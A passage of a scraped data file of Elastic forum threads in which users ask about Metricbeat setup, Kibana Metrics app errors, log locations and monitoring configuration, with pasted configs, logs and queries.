    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2e703cc6-01c2-47aa-96a4-0bd9afed96e8",
    "url": "https://discuss.elastic.co/t/viewing-metrics-500-internal-server-error/225501",
    "title": "Viewing Metrics -- 500 Internal Server Error",
    "category": [
      "Metrics"
    ],
    "author": "eugeneswalker",
    "date": "March 29, 2020, 9:06am March 30, 2020, 9:25am April 20, 2020, 8:11pm",
    "body": "I'm using ELK 7.6.1, all running on the same physical node as docker containers, launched via a docker-compose file. The only shipper setup so far is Filebeat for sending system logs. I can view these in Kibana. The problem is, when I try to bring up the Metrics page in Kibana UI, I am getting a pop-up in the lower right side of screen saying Error while fetching resource Error: Internal Server Error (500) URL: http://instinct.nic.uoregon.edu:5601/api/metrics/snapshot This is my browser console error: POST http://instinct.nic.uoregon.edu:5601/api/metrics/snapshot 500 (Internal Server Error) commons.bundle.js:3 Uncaught (in promise) Error: Internal Server Error at fetchResponse$ (commons.bundle.js:3) at s (kbn-ui-shared-deps.js:338) at Generator._invoke (kbn-ui-shared-deps.js:338) at Generator.forEach.e.<computed> [as next] (kbn-ui-shared-deps.js:338) at s (kbn-ui-shared-deps.js:338) at t (kbn-ui-shared-deps.js:338) at kbn-ui-shared-deps.js:338 Server log $> docker logs -f elk_kibana_1 | grep 500 ... {\"type\":\"response\",\"@timestamp\":\"2020-03-28T17:04:17Z\",\"tags\":[\"access:infra\"],\"pid\":6,\"method\":\"post\",\"statusCode\":500,\"req\":{\"url\":\"/api/metrics/snapshot\",\"method\":\"post\",\"headers\":{\"host\":\"instinct.nic.uoregon.edu:5601\",\"connection\":\"keep-alive\",\"content-length\":\"193\",\"kbn-version\":\"7.6.1\",\"user-agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\"content-type\":\"application/json\",\"accept\":\"*/*\",\"origin\":\"http://instinct.nic.uoregon.edu:5601\",\"referer\":\"http://instinct.nic.uoregon.edu:5601/app/infra\",\"accept-encoding\":\"gzip, deflate\",\"accept-language\":\"en-US,en;q=0.9\"},\"remoteAddress\":\"73.96.133.171\",\"userAgent\":\"73.96.133.171\",\"referer\":\"http://instinct.nic.uoregon.edu:5601/app/infra\"},\"res\":{\"statusCode\":500,\"responseTime\":135,\"contentLength\":9},\"message\":\"POST /api/metrics/snapshot 500 135ms - 9.0B\"} Any ideas why I am seeing this only on the Metrics page? There are no metrics being shipped, but I imagine that should not be a reason for an ISE 500. Kibana is otherwise working as I would expect. I am new to ELK so totally possible I am doing something dumb.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "88d972db-c0e8-4219-8848-e3802ed5afdb",
    "url": "https://discuss.elastic.co/t/cant-find-metricbeat-log-file/226525",
    "title": "Can't find Metricbeat log file",
    "category": [
      "Metrics"
    ],
    "author": "cylon86",
    "date": "April 4, 2020, 6:02pm April 14, 2020, 4:52pm",
    "body": "Hello, I'm trying to setup metricbeat to monitor my cluster but I have some trouble. The first one is that I can't find the metricbeat execution logs to debug the issue... When I run systemctl status metricbeat.service I can see that the service is running but there are some errors: metricbeat.service - Metricbeat is a lightweight shipper for metrics. Loaded: loaded (/lib/systemd/system/metricbeat.service; disabled; vendor preset: enabled) Active: active (running) since Sat 2020-04-04 16:12:30 UTC; 2s ago Docs: https://www.elastic.co/products/beats/metricbeat Main PID: 17509 (metricbeat) Tasks: 16 (limit: 2361) CGroup: /system.slice/metricbeat.service └─17509 /usr/share/metricbeat/bin/metricbeat -e -c /etc/metricbeat/metricbeat.yml -path.home /usr/share/metricbeat -path.config /etc/metricbeat -path.data /var/lib/metricbeat -path.logs /var/log/metricbeat Apr 04 16:12:30 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:30.158Z INFO add_cloud_metadata/add_cloud_metadata.go:93 add_cloud_metadata: hosting provider type detected as aws, metadata={\"account\":{\"id\":\"032854191254\"},\"availability_zone\":\"eu-west Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.166Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.ccr: error determining if connected Elasticsearch node is master: error making http request: Get https: Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.166Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.index_summary: error determining if connected Elasticsearch node is master: error making http request: Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.166Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.index: error determining if connected Elasticsearch node is master: error making http request: Get http Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.166Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.shard: error determining if connected Elasticsearch node is master: error making http request: Get http Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.167Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.node_stats: error making http request: Get https://elasticsearch.node1.com:9200/_nodes/_local/stats: di Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.167Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.ml_job: error determining if connected Elasticsearch node is master: error making http request: Get htt Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.167Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.cluster_stats: error determining if connected Elasticsearch node is master: error making http request: Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.167Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.enrich: error determining if connected Elasticsearch node is master: error making http request: Get htt Apr 04 16:12:32 ip-10-0-0-22 metricbeat[17509]: 2020-04-04T16:12:32.167Z INFO module/wrapper.go:252 Error fetching data for metricset elasticsearch.index_recovery: error determining if connected Elasticsearch node is master: error making http request: I would like to check the log file to have the full error message but in the /var/log/metricbeat I only have this: 2020-04-04T15:39:55.106Z INFO instance/beat.go:622 Home path: [/usr/share/metricbeat] Config path: [/etc/metricbeat] Data path: [/var/lib/metricbeat] Logs path: [/var/log/metricbeat]. 2020-04-04T15:39:55.107Z INFO instance/beat.go:630 Beat ID: 6f497682-9759-4632-bfb4-ec4aea766a80 Also in the systemctl status metricbeat.service message I can see that the log file is indeed suppose to be in /var/log/metricbeat: 17509 /usr/share/metricbeat/bin/metricbeat -e -c /etc/metricbeat/metricbeat.yml -path.home /usr/share/metricbeat -path.config /etc/metricbeat -path.data /var/lib/metricbeat -path.logs /var/log/metricbeat So where are my logs ? Thanks for helping PS: I'm on ubuntu and installed metricbeat using .deb package",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c2e4b4f0-49ee-49de-98d4-c45ff0eb11d5",
    "url": "https://discuss.elastic.co/t/bug-report-refresh-in-metrics-app-on-host-level-is-not-working/227249",
    "title": "Bug report: Refresh in Metrics app on host level is not working",
    "category": [
      "Metrics"
    ],
    "author": "JPT",
    "date": "April 9, 2020, 6:53am April 9, 2020, 7:24pm April 14, 2020, 10:56am April 14, 2020, 2:03pm",
    "body": "Hello, we run a cluster on version 7.6.2 and discovered that the refresh as well as the auto refresh are not working if you select one host. Here is how you can retrace the error: In Kibana open Metrics App --> click on a host --> select view metrics --> in the time chooser select \"Last 15 minutes\" (first time works) --> wait for some time and press the refresh button. That will not work. I tried also to use the auto refresh which also doesn't work. Tested with Firefox and Chrome. With a full refresh of the page the newest data is loaded. BR, Jan",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a413d8c0-9124-4985-a506-7f47c5739547",
    "url": "https://discuss.elastic.co/t/raspberry-pi-4s-cpu-temperature-monitoring/227874",
    "title": "Raspberry Pi 4's CPU temperature monitoring",
    "category": [
      "Metrics"
    ],
    "author": "ralones",
    "date": "April 14, 2020, 8:47am",
    "body": "Hello, Is there a metric set or a way to send the Raspberry Pi's CPU temperature to an ES based Grafana platform using Metricbeat?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a269257b-35a2-424d-9445-59c7be40aaae",
    "url": "https://discuss.elastic.co/t/aws-alarms/227077",
    "title": "AWS Alarms",
    "category": [
      "Metrics"
    ],
    "author": "martian1431",
    "date": "April 8, 2020, 8:07am",
    "body": "Good day, I established a connection with AWS to retrieve metrics using ELK stack and metricbeat, everything is working as expected I believe. My question is that can I retrieve metrics for Alarms that were triggered on AWS. I'm a newbie in this field please be kind!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "092b3153-a4f1-4cc0-946e-9f0491959e79",
    "url": "https://discuss.elastic.co/t/metricbeat-not-using-docker-but-getting-error-is-the-docker-daemon-running/226696",
    "title": "Metricbeat: Not using docker but getting error: \"Is the docker daemon running?\"",
    "category": [
      "Metrics"
    ],
    "author": "Deny7",
    "date": "April 6, 2020, 11:40am April 6, 2020, 1:07pm",
    "body": "Hello, I just installed using rpm metricbeat 6.6.2. In /lib/systemd/system I have service metricbeat.service. When I want to run it using service metricbeat start I'm getting error: ERROR instance/beat.go:911 Exiting: error initializing publisher: error initializing processors: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? Exiting: error initializing publisher: error initializing processors: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? I'm not using docker, so I really don't know why I'm getting this error. Can anybodey help? metricbeat.yml # This file is an example configuration file highlighting only the most common # options. The metricbeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/metricbeat/index.html #========================== Modules configuration ============================ metricbeat.config.modules: # Glob pattern for configuration loading path: /etc/metricbeat/modules.d/system.yml # Set to true to enable config reloading reload.enabled: false # Period on which files under path should be checked for changes #reload.period: 10s #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 1 index.codec: best_compression #_source.enabled: false #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #============================== Dashboards ===================================== # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: false # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: #============================== Kibana ===================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: host: \"xxxxxxx:5601\" # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 #host: \"localhost:5601\" # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: #============================= Elastic Cloud ================================== # These settings simplify using Metricbeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `<user>:<pass>`. #cloud.auth: #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"xxxxxxxxx:9200\"] # Protocol - either `http` (default) or `https`. #protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" #username: \"elastic\" #password: \"changeme\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"localhost:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] #============================== X-Pack Monitoring =============================== # metricbeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Metricbeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: #================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true system.yml - module: system period: 10s metricsets: - cpu - load - memory - network #- process #- process_summary #- socket_summary #- entropy #- core - diskio #- socket #- service process.include_top_n: by_cpu: 5 # include top 5 processes by CPU by_memory: 5 # include top 5 processes by memory - module: system period: 1m metricsets: - filesystem - fsstat processors: - drop_event.when.regexp: system.filesystem.mount_point: '^/(sys|cgroup|proc|dev|etc|host|lib)($|/)' - module: system period: 15m metricsets: - uptime #- module: system # period: 5m # metricsets: # - raid # raid.mount_point: '/'",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "48bfb236-3a43-46fe-b8fc-337831ea2f4e",
    "url": "https://discuss.elastic.co/t/is-this-possible/226713",
    "title": "Is this possible?",
    "category": [
      "Metrics"
    ],
    "author": "Thomas1",
    "date": "April 6, 2020, 12:46pm",
    "body": "Hi everyone, We would like to use an SQL DB (MySQL to be exact) with ELK in order to display some financial and banking data. Is this possible? And if the answer is positive, what should we do in order to link MySQL with ELK? Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5b5b9aa8-0dbd-47b8-96f9-2dcfc044fc7f",
    "url": "https://discuss.elastic.co/t/recommended-elasticsearch-node-requirements-for-monitoring-2000-nodes/224057",
    "title": "Recommended Elasticsearch Node requirements for monitoring 2000 nodes",
    "category": [
      "Metrics"
    ],
    "author": "Bingu_Shim",
    "date": "March 18, 2020, 9:26am March 19, 2020, 3:56pm March 20, 2020, 10:50am March 23, 2020, 3:00am April 18, 2020, 2:56am",
    "body": "Hello, I'm starting to research Metricbeat + Kibana Inventory to monitor system resources. The total number machine that we are planning to monitor is about 2,000. Currently I was able to deploy metricbeat to 79 hosts and explore the metric on Kibana Inventory whithout any problem. Next step will be expanding it to more nodes, and I want to prepare enough Elasticsearch Node for it. image1354×755 45.9 KB Currently I've tested with on this environment. 5 Data Nodes (16G/16Core) + 3 Master Node(16G/16Core) metricbeat.yml logging.level: info output.elasticsearch: ... worker: 2 bulk_max_size : 1024 queue: mem : events: 4096 flush.min_events: 2048 max_procs : 1 setup.ilm: enabled : auto setup.dashboards.enabled: false setup.template.settings: index: codec: best_compression number_of_shards: 5 number_of_replicas: 1 refresh_interval: 10s setup.kibana: ... #------ metric beat specific configuration metricbeat.max_start_delay: 10s metricbeat.modules: - module: system metricsets: - cpu # CPU usage - load # CPU load averages - memory # Memory usage - network # Network IO - uptime # System Uptime - fsstat # File system summary metrics - diskio # Disk IO - process_summary # process 요약 enabled: true period: 10s processes: ['.*'] # Configure the metric types that are included by these metricsets. cpu.metrics: [\"percentages\", \"normalized_percentages\"] # The other available options are normalized_percentages and ticks. core.metrics: [\"percentages\"] # The other available option is ticks. processors: - add_host_metadata:",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bd73e561-160b-4b0d-a69d-d0cfac40d355",
    "url": "https://discuss.elastic.co/t/mssql-metrics-configuration/223846",
    "title": "MSSQL Metrics - Configuration",
    "category": [
      "Metrics"
    ],
    "author": "c.tech.cpt",
    "date": "March 17, 2020, 5:43am March 17, 2020, 3:07pm March 19, 2020, 5:16am March 19, 2020, 1:27pm April 16, 2020, 1:26pm",
    "body": "Hi there, We have our log files on a separate drive. How do I configure the beat to pick this up? I've tried to google and found nothing. Thanks Charles",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "bd418bd1-9749-4145-9d08-9dfe99f4fce3",
    "url": "https://discuss.elastic.co/t/u-x-enhancement-requests-adding-disk-i-o-disk-usage-to-metric-choice/224059",
    "title": "U/X Enhancement requests (Adding disk i/o, disk usage to Metric choice)",
    "category": [
      "Metrics"
    ],
    "author": "Bingu_Shim",
    "date": "March 18, 2020, 9:36am March 18, 2020, 3:22pm March 18, 2020, 3:23pm April 15, 2020, 3:23pm",
    "body": "Is it possible to add Disk I/O and DIsk Usage choice at the red box from the image below? I think it would very useful for many of users image1164×848 49.9 KB image1085×879 78.1 KB Since, i couldn't find any related issue on github, I posted it here.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e57eb20f-419a-4fad-aa70-89c1353cee56",
    "url": "https://discuss.elastic.co/t/metricbeat-logs-in-messages/223558",
    "title": "Metricbeat logs in messages",
    "category": [
      "Metrics"
    ],
    "author": "Surendra_Gupta",
    "date": "March 13, 2020, 6:05pm March 16, 2020, 10:43am April 13, 2020, 10:43am",
    "body": "Hi I am getting error in beat and it is stored in /var/log/messages and with 1.GB per day so how can i restrict the logs to enter into it",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3c0958e6-4e55-4711-a942-d86387f05e42",
    "url": "https://discuss.elastic.co/t/metricbeat-on-nginx-reads-only-access-log-and-error-log/223300",
    "title": "Metricbeat on NGINX reads only access.log and error.log",
    "category": [
      "Metrics"
    ],
    "author": "carmine.fabrizio",
    "date": "March 12, 2020, 9:36am March 12, 2020, 9:46am March 12, 2020, 10:39am March 12, 2020, 11:07am March 12, 2020, 11:24am March 12, 2020, 5:42pm March 12, 2020, 5:42pm March 12, 2020, 5:54pm",
    "body": "Hi all, I'm having a strange behavior, my metricbeat is reading only /var/log/nginx/access.log /var/log/nginx/error.log I have different .log file per each location on my NGINX. this is what I configured in my /etc/metricbeat/modules.d/nginx.yml # Module: nginx # Docs: https://www.elastic.co/guide/en/beats/metricbeat/7.6/metricbeat-module-nginx.html - module: nginx access: enabled: true var.paths: [\"/var/log/nginx/*access.log*\"] error: enabled: true var.paths: [\"/path/to/log/nginx/*error.log*\"] metricsets: - stubstatus period: 10s # Nginx hosts hosts: [\"http://127.0.0.1\"] # Path to server status. Default server-status server_status_path: \"basic_status\" any help on this? Thanks!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "2cfc9f44-0af1-4a58-acd4-e2c26a761e96",
    "url": "https://discuss.elastic.co/t/dashboards-para-http-server/222142",
    "title": "Dashboards para HTTP server",
    "category": [
      "Metrics"
    ],
    "author": "DarioLV",
    "date": "March 4, 2020, 6:43pm March 4, 2020, 11:48pm April 1, 2020, 9:52pm",
    "body": "Hola a todos! Estuve buscando bastante y realmente no pude encontrar específicamente lo que preciso. Les cuento como es mi escenario, tengo varias aplicaciones viviendo en tres ambientes: Desarrollo, Testing y Producción. Y cada aplicación tiene un proxy reverso, un balanceador de carga y dos servidores con Tomcat. Quisiera armar un dashboard para cada aplicación donde ver la vida de estos servicios. Uptime me sirve, pero veo todos los servicios, preciso algo que me segmente en dashboards. Es decir, quisiera esto: Dashboard 1 Nodo 1 con Apache2 Nodo 2 con Haproxy Nodo 3 con Tomcat Nodo 4 con Tomcat Dashboard 2 Nodo 1 con Apache2 Nodo 2 con Haproxy Nodo 3 con Tomcat Nodo 4 con Tomcat Y asi X dashboards. Cómo tendría que hacer? Gracias de antemano!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "64f7d89a-acaa-4493-bb3a-e5917ca9b9de",
    "url": "https://discuss.elastic.co/t/monitoring-container-specific-metrices/221853",
    "title": "Monitoring container specific metrices",
    "category": [
      "Metrics"
    ],
    "author": "Pucky",
    "date": "March 3, 2020, 10:32am March 31, 2020, 10:32am",
    "body": "Is there any way to monitor metrics according to different containers? I'd like to pick up when a specific container is being abusive or at least to work out how many resources each container is using. I don't really want to be running metricbeat on each container to get this data. Any solutions? Am I missing the boat?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cf77168a-d820-47fc-8a7d-835c733fa889",
    "url": "https://discuss.elastic.co/t/how-can-we-showcase-multiple-hosts-metrics-in-single-dashboard/214676",
    "title": "How can we showcase multiple hosts metrics in single dashboard",
    "category": [
      "Metrics"
    ],
    "author": "mohitmehral",
    "date": "February 19, 2020, 11:00am February 6, 2020, 3:22pm February 19, 2020, 9:31am March 18, 2020, 9:31am",
    "body": "I have multiple hosts enable on metricbeat. I want to show case hostname wise metrics in single dashboard. as example i attached I use selection bar to distingush multiple users however it wont work while i change value for first 2nd hostname also refreshed. dashboard-Elk1280×463 48.8 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f2b8f355-ccb4-4735-9594-95ac6d2485e4",
    "url": "https://discuss.elastic.co/t/view-metrics-shows-no-data-for-selected-host/218183",
    "title": "View metrics shows no data for selected host",
    "category": [
      "Metrics"
    ],
    "author": "norgro2601",
    "date": "February 6, 2020, 1:31pm February 7, 2020, 12:56pm February 7, 2020, 1:36pm February 10, 2020, 10:13am February 10, 2020, 10:51am February 10, 2020, 3:06pm February 10, 2020, 3:53pm February 10, 2020, 3:53pm February 10, 2020, 4:02pm February 10, 2020, 4:41pm February 10, 2020, 6:03pm February 10, 2020, 6:07pm February 11, 2020, 3:42pm February 11, 2020, 4:14pm February 11, 2020, 4:29pm February 11, 2020, 4:33pm February 11, 2020, 5:15pm February 11, 2020, 5:27pm February 11, 2020, 6:08pm February 11, 2020, 8:31pm",
    "body": "Hi, I struggle with the \"View Metrics\" display, which shows no data for a limited user, but for the elastic superuser. The user can see the inventory of the hosts, when opening the Metrics app, he can change to Logs and get results, also changing to Uptime works fine. But the \"View Metrics\" action only gives the header with the host information, but no further metrics. There are data available, as the elastic user gets metrics for the same hosts. I've checked both users out of the same space. I've also checked with Discover, and the results for both users are the same. Is there a role that needs to be added to the user to get results there ? I'm on 7.5.2 running in Elastic Cloud. Thanks in advance for any advice. Best regards, Norbert",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "760bae11-94d1-42c0-8384-f3b91aea9a72",
    "url": "https://discuss.elastic.co/t/enable-elasticsearch-xpack-in-docker-compose/218036",
    "title": "Enable elasticsearch-xpack in docker compose",
    "category": [
      "Metrics"
    ],
    "author": "tomx1",
    "date": "February 5, 2020, 8:03pm February 6, 2020, 9:36am March 5, 2020, 9:36am",
    "body": "I'm trying to get metricbeat running monitoring our elasticsearch cluster which is managed by docker swarm. See: https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-metricbeat.html Looks quite easy, but I can't figure out how I have to enable the elasticsearch-xpack module after the metricbeat container is up??? /edit Nevermind, seems like I've confused a few things. It's working, sorry for the noise",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0a70ffe3-6a63-4bb6-844e-c8ad7ecb5f39",
    "url": "https://discuss.elastic.co/t/is-there-a-chance-to-reset-the-settings-screen-of-infrastructure/217206",
    "title": "Is there a chance to reset the settings screen of infrastructure?",
    "category": [
      "Metrics"
    ],
    "author": "Peter_Steenbergen",
    "date": "January 30, 2020, 3:46pm January 31, 2020, 3:51pm January 31, 2020, 3:51pm January 31, 2020, 4:29pm February 3, 2020, 11:47am February 5, 2020, 10:30pm February 5, 2020, 10:56pm March 4, 2020, 11:00pm",
    "body": "I used ./metricbeat setup to import the template of metricbeat. However the screen of the settings is blank so I cant select the event.dataset.keyword field over event.dataset field to remove this message. What would you guys recommend? Is there an easy way to edit the field where to get the data from? Schermafbeelding 2020-01-30 om 15.09.051646×706 36.9 KB Schermafbeelding 2020-01-30 om 15.09.121652×840 19 KB",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "9bb6f960-1d76-481a-a1fe-62598c2d2ec6",
    "url": "https://discuss.elastic.co/t/alerting-on-metrics/217873",
    "title": "Alerting on metrics",
    "category": [
      "Metrics"
    ],
    "author": "stuart475898",
    "date": "February 4, 2020, 8:36pm February 4, 2020, 10:20pm March 3, 2020, 10:20pm",
    "body": "Hello, Currently doing some initial research into elastic for use among other things as an infrastructure monitoring tool. Metricbeat + elastic appear to give us exactly the sort of thing we want, so I started the 14 day trial to test out alerting. How should watcher be used for infrastructure monitoring? How do I apply a rule to a group of servers e.g. when CPU above 80% for 5 minutes for this group of endpoints, alert. When CPU at 100% for 5 minutes for this group of endpoints, alert. From what I can tell, the only way that may be possible to achieve this is to do it in straight up JSON, which is disappointing if it is not possible in the UI. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "186919b5-7c8f-4282-b337-4285aa352db7",
    "url": "https://discuss.elastic.co/t/how-is-the-system-network-in-dropped-calculated/212403",
    "title": "How is the system.network.in.dropped calculated?",
    "category": [
      "Metrics"
    ],
    "author": "javadevmtl",
    "date": "December 18, 2019, 9:24pm December 18, 2019, 10:54pm December 18, 2019, 11:17pm December 19, 2019, 3:40pm January 16, 2020, 3:40pm",
    "body": "Hi, I have noticed a machine has a \"higher\" rate of dropped packets vs other machines. This machine is about +1% packet loss vs other machines are way below 1% I.e: Machine 1: 14 dropped packets over 200 million Machine 2: 2 million over 200 Million. You see \"dropped\": 2750373. Is this number cumulative over the uptime of the machine? Or is that how many packets where dropped at that particular timestamp? I run this query: GET metricbeat-*/_search { \"size\": 100, \"_source\": [\"@timestamp\", \"system.network.in.dropped\", \"host.name\"], \"query\": { \"query_string\" : { \"query\" : \"metricset.name:network AND host.name:XXXXXX-0001\" } } } And I get... { \"took\": 99, \"timed_out\": false, \"_shards\": { \"total\": 7, \"successful\": 7, \"skipped\": 0, \"failed\": 0 }, \"hits\": { \"total\": 118220, \"max_score\": 5.0651484, \"hits\": [ { \"_index\": \"metricbeat-6.4.2-2019.12.16\", \"_type\": \"doc\", \"_id\": \"Km65DW8Bbyfak3QNTgOk\", \"_score\": 5.0651484, \"_source\": { \"@timestamp\": \"2019-12-16T08:00:44.724Z\", \"system\": { \"network\": { \"in\": { \"dropped\": 0 } } }, \"host\": { \"name\": \"XXXXXX-0001\" } } }, { \"_index\": \"metricbeat-6.4.2-2019.12.16\", \"_type\": \"doc\", \"_id\": \"K265DW8Bbyfak3QNTgOk\", \"_score\": 5.0651484, \"_source\": { \"@timestamp\": \"2019-12-16T08:00:44.724Z\", \"system\": { \"network\": { \"in\": { \"dropped\": 2750373 } } }, \"host\": { \"name\": \"XXXXXX-0001\" } } } } ] } }",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d6850c5d-2e96-444c-9a63-0997751d095d",
    "url": "https://discuss.elastic.co/t/change-indices-settings-in-metric-app/211769",
    "title": "Change indices settings in Metric app",
    "category": [
      "Metrics"
    ],
    "author": "norgro2601",
    "date": "December 13, 2019, 9:21am December 17, 2019, 2:50pm December 17, 2019, 1:06pm December 17, 2019, 2:50pm January 14, 2020, 2:50pm",
    "body": "Hi, we have a lot of servers due to several kubernets environments, that are monitored by the Elastic stack. Due to this fact, I often get an error \"Failed to load datasources\" (Response 504) when opening the metrics or logs app. I want to speed up and get the search running again by changing the indices settings for each space, cause each space only uses a subset of the available filebeat and metricbeat indices. Unfortunately the settings page is also not working after the error occurred, I get a blank screen. Is there an API that I can use to change the settings ? And wouldn't it make more sense to have the settings added to the \"Advanced Settings\" on the Management panel as it is for e.g. the SIEM app ? Thanks in advance. Regards, Norbert",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "760fd047-d267-45d2-8678-0148659e729d",
    "url": "https://discuss.elastic.co/t/cannot-visualize-windows-server-counters/212168",
    "title": "Cannot visualize windows server counters",
    "category": [
      "Metrics"
    ],
    "author": "thomas7467",
    "date": "December 17, 2019, 1:37pm January 14, 2020, 1:37pm",
    "body": "Hi all, I've just installed 7.5.0 elastic and Kibana on an Bionic ubuntu server. I've installed 7.5.0 metricbeats on a windows server Dataflow seems to be OK on elastic side, docs count increase normally in Kibana index management, but I cannot see any data in the Kibana visualize Folder, did I miss something? Thank you Thomas",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "69b802f4-d198-462b-b3fb-41fc8c104c97",
    "url": "https://discuss.elastic.co/t/cant-monitor-windows-perfmon-counter/210726",
    "title": "Cant monitor windows perfmon counter",
    "category": [
      "Metrics"
    ],
    "author": "Alexandros888",
    "date": "December 6, 2019, 11:57am December 16, 2019, 1:07pm December 16, 2019, 2:28pm January 13, 2020, 2:28pm",
